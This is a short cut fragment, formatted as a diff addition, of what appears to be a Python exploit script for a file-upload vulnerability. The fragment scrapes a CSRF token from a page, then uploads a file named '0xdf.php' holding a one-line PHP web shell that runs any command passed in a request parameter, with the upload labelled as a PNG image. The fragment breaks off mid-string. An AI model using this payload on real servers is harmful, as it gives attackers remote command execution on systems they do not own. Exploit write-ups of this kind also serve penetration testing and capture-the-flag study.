@@ -1,0 +1,1 @@
+dex.php ' ) csrf = re . findall ( ' \n var tokenCSRF = " ([0-9a-f]{32,}) " ; ' , resp . text )[ 0 ] # Upload webshell form_data = { ' images[] ' : ( ' 0xdf.php ' , ' <?php system($_REQUEST[ " cmd " ]); ?> ' , ' image/png
